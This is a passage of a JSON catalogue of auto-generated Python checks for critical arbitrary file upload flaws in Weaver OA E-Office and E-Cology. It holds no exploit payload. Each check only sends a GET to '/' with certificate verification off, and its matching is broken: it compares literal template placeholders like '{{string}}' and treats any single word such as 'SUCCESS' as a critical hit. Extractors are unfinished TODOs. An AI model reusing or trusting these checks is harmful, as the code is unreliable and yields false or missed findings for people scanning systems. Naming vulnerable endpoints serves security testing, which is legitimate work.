          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_base(5))}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "{{randstr}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-jquery-file-upload\nName: OA E-Office jQuery - Arbitrary File Upload\nSeverity: critical\nDescription: Arbitrary File Upload in OA E-Office jQuery.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_jquery_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-jquery-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office jQuery - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200; status_code_3 == 200 && contains(body_3,'{{string}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{string}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office jQuery - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_jquery_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-jquery-file-upload\nName: OA E-Office jQuery - Arbitrary File Upload\nSeverity: critical\nDescription: Arbitrary File Upload in OA E-Office jQuery.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_jquery_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-jquery-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office jQuery - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200; status_code_3 == 200 && contains(body_3,'{{string}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{string}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office jQuery - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_jquery_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "weaver",
          "e-office",
          "oa",
          "instrusive",
          "rce",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_weaver_ktreeuploadaction_file_upload",
        "name": "Weaver E-Cology KtreeUploadAction - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is a file upload vulnerability in Weaver E-Cology. An attacker can upload any file through KtreeUploadAction.jsp and further exploit it.",
        "severity": "critical",
        "detection": "[AND] DSL: status_code_1 == 200 && contains_all(body_1,'original', 'SUCCESS'); contains(body_2, '{{result}}') && status_code_2 == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "num1",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: num1",
            "default": "{{rand_int(40000, 50000)}}"
          },
          {
            "name": "num2",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: num2",
            "default": "{{rand_int(40000, 50000)}}"
          },
          {
            "name": "result",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: result",
            "default": "{{to_number(num1)*to_number(num2)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-ktreeuploadaction-file-upload\nName: Weaver E-Cology KtreeUploadAction - Arbitrary File Upload\nSeverity: critical\nDescription: There is a file upload vulnerability in Weaver E-Cology. An attacker can upload any file through KtreeUploadAction.jsp and further exploit it.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_ktreeuploadaction_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-ktreeuploadaction-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Weaver E-Cology KtreeUploadAction - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200 && contains_all(body_1,'original', 'SUCCESS'); contains(body_2, '{{result}}') && status_code_2 == 200\"\n\n        # Simple word matcher simulation\n        matchers = ['original', 'SUCCESS', '{{result}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Weaver E-Cology KtreeUploadAction - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_ktreeuploadaction_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-ktreeuploadaction-file-upload\nName: Weaver E-Cology KtreeUploadAction - Arbitrary File Upload\nSeverity: critical\nDescription: There is a file upload vulnerability in Weaver E-Cology. An attacker can upload any file through KtreeUploadAction.jsp and further exploit it.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_ktreeuploadaction_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-ktreeuploadaction-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Weaver E-Cology KtreeUploadAction - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code_1 == 200 && contains_all(body_1,'original', 'SUCCESS'); contains(body_2, '{{result}}') && status_code_2 == 200\"\n\n        # Simple word matcher simulation\n        matchers = ['original', 'SUCCESS', '{{result}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Weaver E-Cology KtreeUploadAction - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_ktreeuploadaction_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "weaver",
          "ecology",
          "fileupload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_weaver_lazyuploadify_file_upload",
        "name": "OA E-Office LazyUploadify - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "OA E-Office LazyUploadify is vulnerable to arbitrary file upload.",
        "severity": "critical",
        "detection": "[AND] DSL: contains(body_2, 'attachmentID') && contains(body_2, 'attachmentName') | mot(s) '{{md5(string)}}'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_base(5))}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "weaver-lazyuploadify-file-upload"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-lazyuploadify-file-upload\nName: OA E-Office LazyUploadify - Arbitrary File Upload\nSeverity: critical\nDescription: OA E-Office LazyUploadify is vulnerable to arbitrary file upload.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_lazyuploadify_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-lazyuploadify-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office LazyUploadify - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: contains(body_2, 'attachmentID') && contains(body_2, 'attachmentName') | mot(s) '{{md5(string)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['attachmentID', 'attachmentName', '{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office LazyUploadify - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    